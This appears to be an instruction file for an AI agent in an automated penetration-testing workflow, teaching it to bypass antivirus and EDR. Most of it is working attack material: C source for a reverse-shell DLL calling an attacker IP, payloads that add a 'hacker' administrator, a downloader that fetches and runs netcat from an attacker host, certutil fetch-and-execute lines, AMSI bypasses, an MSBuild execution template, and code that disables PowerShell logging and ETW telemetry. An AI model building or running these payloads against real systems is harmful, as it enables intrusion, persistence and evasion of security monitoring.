---
name: av-edr-evasion
description: >
  Bypass antivirus and EDR detection for payload delivery during exploitation.
  Covers custom payload compilation (mingw C, Go), AMSI bypass, shellcode
  alternatives, and ETW patching. Route here when an agent reports a payload
  was quarantined, blocked, or detected by endpoint protection.
keywords:
  - AMSI bypass
  - antivirus evasion
  - EDR bypass
  - Windows Defender
  - payload obfuscation
  - mingw DLL
  - custom payload
  - ETW patching
  - shellcode encoding
  - quarantine
  - CrowdStrike
  - SentinelOne
tools:
  - mingw-w64
  - python3
  - go (optional)
opsec: high
---

# AV/EDR Evasion

You are helping a penetration tester bypass AV/EDR that is blocking payload
execution during an authorized engagement. All testing is under explicit
written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[av-edr-evasion] Activated → <target>` to the screen on activation.
- **Evidence** → save compiled payloads and artifacts to
  `engagement/evidence/evasion/` with descriptive filenames (e.g.,
  `custom-dll-winexec-x64.dll`, `amsi-bypass.ps1`).

Create the evasion evidence directory if it doesn't exist:
```bash
mkdir -p engagement/evidence/evasion
```

## Scope Boundary

This skill covers **payload generation and runtime evasion only**. It does NOT
cover:
- The exploit technique itself (that's the calling skill's job)
- C2 framework setup or long-term implant development
- Full EDR agent removal or tampering
- Persistence mechanisms

When you have built and optionally verified the bypass payload — **STOP**.
Return to the orchestrator with the artifact path, bypass method, and runtime
prerequisites. The orchestrator will re-invoke the original technique skill
with your payload.

**Stay in methodology.** Only use techniques documented in this skill. If you
encounter a scenario not covered here, note it and return — do not improvise
novel evasion techniques or write complex custom tooling beyond what's
documented below.

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Understand what was blocked and on which target
- Check existing access methods for payload delivery
- Identify the target OS version and architecture

## Exploit and Tool Transfer

Never download exploits, scripts, or tools directly to the target from the
internet. Targets may lack outbound access, and operators must review files
before execution on target.

**Attackbox-first workflow:**

1. **Compile on attackbox** — all payloads are built locally
2. **Review** — operator can inspect the C/Go source in this skill
3. **Serve** — `python3 -m http.server 8080` from the directory containing the file
4. **Pull from target** — `wget http://ATTACKBOX:8080/file -O C:\Windows\Temp\file`
   or `curl`, `certutil`, evil-winrm `upload`, SMB transfer

## Prerequisites

Context from the orchestrator (provided in Task prompt):
- **What was blocked**: payload type (DLL, EXE, script, webshell)
- **How detected**: signature, behavioral, AMSI, heuristic
- **AV product**: Windows Defender, CrowdStrike, SentinelOne, etc. (if known)
- **Payload requirements**: what the exploit needs (e.g., "x64 DLL with
  DllMain entry point", "EXE that adds admin user")
- **Target OS**: version and architecture
- **Current access**: user, method, shell session reference

Attackbox tools:
- `x86_64-w64-mingw32-gcc` / `i686-w64-mingw32-gcc` — mingw cross-compiler
  (`apt install mingw-w64`)
- `python3` — for struct packing alternatives
- `go` (optional) — for Go cross-compilation

### Tool output directory

Compile payloads to `$TMPDIR` then move to evidence:
```bash
# Compile
x86_64-w64-mingw32-gcc -shared -o $TMPDIR/payload.dll payload.c
# Save evidence
mv $TMPDIR/payload.dll engagement/evidence/evasion/payload.dll
```

## Step 1: Assess the Detection

If not already provided by the orchestrator, determine:

1. **What payload type was blocked?** — DLL, EXE, script (PS1/BAT), webshell (JSP/ASPX/PHP)
2. **How was it detected?** — signature (file on disk caught), behavioral (process killed at runtime), AMSI (PowerShell/script blocked), heuristic (unknown detection)
3. **What AV/EDR product?** — Windows Defender, CrowdStrike Falcon, SentinelOne, Symantec, Carbon Black, etc.
4. **What does the exploit need?** — DLL with DllMain, EXE that runs a command, service binary, webshell file

Skip if context was already provided.

### Detection Type → Bypass Route

| Detection | Indicators | Go to |
|-----------|-----------|-------|
| **Signature** (most common) | msfvenom payload, known tool binary, file quarantined on write | Step 2: Custom Payload Compilation |
| **AMSI** | PowerShell command blocked, "This script contains malicious content" | Step 3: AMSI Bypass |
| **Behavioral** | Process starts then dies within 1-2 seconds, no file quarantine | Step 4: Alternative Execution Methods |
| **Heuristic/ML** | Unknown detection, no clear signature match | Step 2 first, then Step 4 if still caught |
| **ETW/Logging** | Need to reduce telemetry before executing payload | Step 5: ETW Patching |

## Step 2: Custom Payload Compilation

When signature detection catches msfvenom or known tool binaries, compile
custom payloads from C source. These work because they call legitimate Win32
APIs directly — no encoded shellcode buffer, no decoder stub, no msfvenom
signature patterns.

### DLL Payloads

For service abuse, DnsAdmins, DLL hijacking, or any technique needing a DLL.

#### Variant A: Mingw C — Command Execution via WinExec

Simplest and most reliable. Executes a single command when DllMain is called.

```c
// payload.c — Custom DLL with command execution
// Compile: x86_64-w64-mingw32-gcc -shared -o payload.dll payload.c
// For 32-bit: i686-w64-mingw32-gcc -shared -o payload.dll payload.c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        // Replace with actual command — e.g., add admin user, reverse shell
        WinExec("cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add", 0);
    }
    return TRUE;
}
```

**Common command payloads:**

Add local admin:
```
cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add
```

PowerShell reverse shell (if AMSI is not blocking):
```
powershell.exe -nop -w hidden -e <BASE64_ENCODED_REVSHELL>
```

Certutil download + execute:
```
cmd.exe /c certutil -urlcache -split -f http://ATTACKBOX:8080/nc.exe C:\\Windows\\Temp\\nc.exe && C:\\Windows\\Temp\\nc.exe -e cmd.exe ATTACKBOX PORT
```

#### Variant B: Mingw C — Winsock Reverse Shell (Non-Blocking)

For DLL injection scenarios where DllMain must return quickly (the calling
process hangs if DllMain blocks). Spawns reverse shell in a new thread.

```c
// revshell.c — Non-blocking reverse shell DLL
// Compile: x86_64-w64-mingw32-gcc -shared -o revshell.dll revshell.c -lws2_32
#include <windows.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32")

// Change these to match your listener
#define ATTACKER_IP   "10.10.14.1"
#define ATTACKER_PORT 4444

DWORD WINAPI ReverseShell(LPVOID lpParam) {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in addr;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2, 2), &wsa);
    sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    addr.sin_family = AF_INET;
    addr.sin_port = htons(ATTACKER_PORT);
    addr.sin_addr.s_addr = inet_addr(ATTACKER_IP);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);

    closesocket(sock);
    WSACleanup();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        CreateThread(NULL, 0, ReverseShell, NULL, 0, NULL);
    }
    return TRUE;
}
```

**Compilation:**
```bash
# x64
x86_64-w64-mingw32-gcc -shared -o $TMPDIR/revshell.dll revshell.c -lws2_32

# x86
i686-w64-mingw32-gcc -shared -o $TMPDIR/revshell.dll revshell.c -lws2_32

# Move to evidence
mv $TMPDIR/revshell.dll engagement/evidence/evasion/revshell.dll
```

#### Variant C: Go Cross-Compile DLL

Alternative toolchain when mingw payloads are still caught or when Go is
preferred. Go binaries have different signatures than C/mingw.

```go
// payload.go — Go DLL with command execution
// Build: CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc GOOS=windows GOARCH=amd64 \
//        go build -buildmode=c-shared -ldflags="-s -w" -o payload.dll payload.go
package main

import "C"
import (
    "os/exec"
)

//export DllMain
func DllMain() {
    cmd := exec.Command("cmd.exe", "/c", "net user hacker Password123! /add && net localgroup administrators hacker /add")
    cmd.Run()
}

func main() {}
```

**Build:**
```bash
CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc GOOS=windows GOARCH=amd64 \
    go build -buildmode=c-shared -ldflags="-s -w" -o $TMPDIR/payload.dll payload.go
mv $TMPDIR/payload.dll engagement/evidence/evasion/payload.dll
```

### EXE Payloads

For service binpath abuse, direct execution, scheduled tasks.

#### Variant A: Simple Command Execution

```c
// payload_exe.c — Custom EXE with command execution
// Compile: x86_64-w64-mingw32-gcc -o payload.exe payload_exe.c
#include <windows.h>

int main() {
    WinExec("cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add", 0);
    return 0;
}
```

#### Variant B: Staged Downloader

Downloads and executes a second-stage payload. Useful when you need a larger
tool on target but don't want to compile it into the binary.

```c
// downloader.c — Downloads a file from attackbox and executes it
// Compile: x86_64-w64-mingw32-gcc -o downloader.exe downloader.c -lurlmon
#include <windows.h>
#include <urlmon.h>

#pragma comment(lib, "urlmon")

int main() {
    // Download second stage from attackbox
    URLDownloadToFileA(NULL,
        "http://ATTACKBOX:8080/nc.exe",
        "C:\\Windows\\Temp\\svc.exe",
        0, NULL);
    // Execute
    WinExec("C:\\Windows\\Temp\\svc.exe -e cmd.exe ATTACKBOX PORT", 0);
    return 0;
}
```

### Why Custom C Works

msfvenom payloads are caught because AV vendors signature their decoder stubs,
shellcode patterns, and PE structure. Custom C payloads:
- Call `WinExec()` / `CreateProcess()` directly — legitimate Win32 API calls
- No encoded shellcode buffer in the `.text` section
- No NOP sled, no decoder stub, no `VirtualAlloc` + `memcpy` shellcode loader
- Different PE structure, import table, and section layout than msfvenom output
- Each compilation produces a unique binary hash

**This is not obfuscation — it's just writing normal C code that does what you
need instead of using a tool whose output is universally signatured.**

## Step 3: AMSI Bypass

When PowerShell or .NET-based tools are blocked by the Antimalware Scan
Interface. AMSI intercepts script content before execution and sends it to the
AV engine for scanning.

### Variant A: Reflection — amsiInitFailed

Forces AMSI to think initialization failed, so it skips all scanning.

```powershell
# Reflection-based AMSI bypass (one-liner)
# Sets the amsiInitFailed field to True via reflection
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**If the above is caught** (the string "AmsiUtils" itself is flagged), use
concatenation to break the signature:

```powershell
# Obfuscated variant — breaks known string signatures
$a = [Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils')
$b = $a.GetField('am'+'siIn'+'itFailed','NonPublic,Static')
$b.SetValue($null,$true)
```

### Variant B: Memory Patching — AmsiScanBuffer

Patches the `AmsiScanBuffer` function in memory to always return clean.

```powershell
# AmsiScanBuffer memory patch
# Overwrites the function's first bytes to return AMSI_RESULT_CLEAN
$w = 'System.Management.Automation.Am' + 'siUtils'
$t = [Ref].Assembly.GetType($w)
$m = $t.GetField('amsiContext','NonPublic,Static')
$ptr = $m.GetValue($null)

# Load amsi.dll and find AmsiScanBuffer
$amsi = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE(
    [System.AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.Location -like '*amsi*' } |
    Select-Object -First 1
)
```

### Variant C: PowerShell Downgrade

Force PowerShell v2 which doesn't have AMSI (requires .NET 2.0 installed):

```powershell
powershell.exe -version 2 -command "<your command>"
```

**Note**: PowerShell v2 is often removed on modern systems. Check with:
```powershell
Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2
```

### Verification

After applying any AMSI bypass, verify it works:
```powershell
# This string normally triggers AMSI — if bypass worked, it returns without error
"amsiutils"
# Or try loading a tool that was previously blocked
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKBOX:8080/tool.ps1')
```

## Step 4: Alternative Execution Methods

When behavioral detection blocks the execution pattern — the payload file
survives on disk but gets killed at runtime, or the execution method itself
is monitored.

### LOLBin Execution

Use legitimate Windows binaries to execute payloads (Living Off the Land):

**MSBuild inline task** (executes C# without dropping a standalone EXE):
```xml
<!-- payload.csproj — save to target, execute with: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Build">
    <ClassExample />
  </Target>
  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
        using System;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        using System.Diagnostics;
        public class ClassExample : Task, ITask {
            public override bool Execute() {
                Process.Start("cmd.exe", "/c YOUR_COMMAND_HERE");
                return true;
            }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

**InstallUtil** (executes .NET assembly via uninstall handler):
```bash
# Compile a .NET assembly with an [RunInstaller] class, then:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
```

**Rundll32** (execute exported function from custom DLL):
```bash
# If your DLL exports a function named "Run":
rundll32.exe payload.dll,Run
```

### Certutil for Delivery

When direct HTTP download is blocked but certutil is available:
```bash
# Download via certutil (base64 encode first on attackbox)
certutil -urlcache -split -f http://ATTACKBOX:8080/payload.exe C:\Windows\Temp\payload.exe

# Or decode from base64 if HTTP is blocked:
# On attackbox: base64 payload.exe > payload.b64
# Transfer payload.b64 to target, then:
certutil -decode payload.b64 C:\Windows\Temp\payload.exe
```

### PowerShell Constrained Language Mode Bypass

If CLM blocks PowerShell execution:
```powershell
# Check if CLM is active
$ExecutionContext.SessionState.LanguageMode
# If "ConstrainedLanguage", try:

# Option 1: Use cmd.exe instead of PowerShell
cmd.exe /c "command here"

# Option 2: Use MSBuild inline task (above) — not subject to CLM

# Option 3: Use PowerShell v2 (if available) — no CLM enforcement
powershell.exe -version 2
```

## Step 5: ETW Patching

When you need to reduce telemetry before executing a payload. ETW (Event
Tracing for Windows) feeds data to EDR agents and Windows logging.

**Patch EtwEventWrite** to prevent ETW events from being generated:
```powershell
# ETW bypass — patch EtwEventWrite to return immediately
$ntdll = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE(
    [System.AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1] -eq 'System.dll' }
)
# Note: Full implementation depends on architecture and .NET version
# The concept: overwrite EtwEventWrite's first bytes with "ret" (0xC3)
```

**.NET ETW bypass** (prevents .NET runtime from generating ETW events):
```powershell
# Disable .NET ETW tracing
[Reflection.Assembly]::LoadWithPartialName('System.Core')
$etwType = [System.Diagnostics.Tracing.EventSource]
# Patch internal tracing flag
```

**Script block logging evasion** (prevents PowerShell commands from being
logged to event log 4104):
```powershell
# Disable script block logging for this session
$settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null)
$settings['ScriptBlockLogging'] = @{}
$settings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
$settings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
```

## Step 6: Verify Bypass

Before returning the payload to the orchestrator, verify it survives on target
if possible (requires existing access to the target).

### File Survival Test

1. Transfer the payload to target via existing access method
2. Wait 30 seconds (give real-time scanning time to process)
3. Check if the file still exists:
   ```
   dir C:\Windows\Temp\payload.dll
   ```
4. If the file is gone → AV quarantined it → try a different variant (Go
   instead of C, different API call, different execution method)

### AMSI Verification

If AMSI bypass was applied:
```powershell
# This string is a known AMSI test trigger
"AmsiUtils"
# If no error → bypass is working
# Then test the actual tool/script that was blocked
```

### Don't Execute the Exploit

**Verify only that the artifact survives on disk. Do NOT execute the exploit
or the payload's intended function.** The original technique skill handles
exploitation. Your job is to deliver a payload that won't be caught.

## Escalate or Pivot

After building and optionally verifying the bypass, **STOP** and return to
the orchestrator with:

**Return format:**
```

## Evasion Results: <target> (<original-technique>)

### Detection Assessment
- Blocked payload: <what was caught>
- AV/EDR: <product>
- Detection type: <signature/behavioral/AMSI/heuristic>

### Bypass Built
- Artifact: engagement/evidence/evasion/<filename>
- Method: <e.g., "mingw C DLL with WinExec, no shellcode">
- Architecture: <x64/x86>
- Verified on target: <yes/no>

### Runtime Prerequisites
- <e.g., "Run AMSI bypass first", "None", "Transfer nc.exe for reverse shell">

### Evidence
- engagement/evidence/evasion/<filename>
```

The orchestrator will re-invoke the original technique skill with your payload
and instructions.

## Troubleshooting

### mingw-w64 not installed
```bash
sudo apt install mingw-w64
```
Verify: `x86_64-w64-mingw32-gcc --version`

### Wrong architecture — x86 vs x64
Check target architecture. 64-bit Windows can run 32-bit EXEs but DLLs must
match the loading process architecture. Use `systeminfo` output from the
target:
- "x64-based PC" → `x86_64-w64-mingw32-gcc`
- "x86-based PC" → `i686-w64-mingw32-gcc`
For DLLs loaded by a specific process, check the process architecture with
`tasklist /v` on target.

### Custom DLL still caught
Some aggressive AV heuristics flag DLLs with `WinExec` or `CreateProcess` in
the import table. Options:
1. Try Go cross-compilation (Variant C) — different binary structure
2. Use `system()` instead of `WinExec()` — different import
3. Use indirect API resolution via `GetProcAddress`:
   ```c
   typedef UINT (WINAPI *pWinExec)(LPCSTR, UINT);
   pWinExec fWinExec = (pWinExec)GetProcAddress(GetModuleHandleA("kernel32.dll"), "WinExec");
   fWinExec("cmd.exe /c command", 0);
   ```

### AMSI bypass patched / doesn't work
Microsoft patches AMSI bypass techniques periodically. If one variant fails:
1. Try the next variant (A → B → C)
2. Obfuscate string constants further (split into more pieces)
3. Fall back to non-PowerShell execution (MSBuild, cmd.exe, certutil)
4. If all AMSI bypasses fail and PowerShell is required, report blocked

### Constrained Language Mode blocks everything
CLM prevents most .NET reflection and type access. Options:
1. Use cmd.exe / native binaries instead of PowerShell
2. MSBuild inline task (not subject to CLM)
3. Custom C# assembly executed via InstallUtil
4. If CLM + AppLocker both active, this is a hardened environment — report
   the constraints and return

### Payload runs but no callback (reverse shell)
1. Check firewall — target may block outbound connections on your port
2. Try common allowed ports: 80, 443, 53
3. Verify listener is running: `list_sessions()` via shell-server MCP
4. Test connectivity: `ping ATTACKBOX` from target (if ICMP allowed)
5. If no outbound at all, fall back to command execution (add user, modify
   service) instead of reverse shell

### AppLocker blocking execution
1. Check AppLocker rules: `Get-AppLockerPolicy -Effective -Xml`
2. Try execution from allowed paths: `C:\Windows\Temp\`, user profile dirs
3. Use LOLBins (MSBuild, InstallUtil) which are often whitelisted
4. DLL execution via rundll32 may bypass EXE restrictions
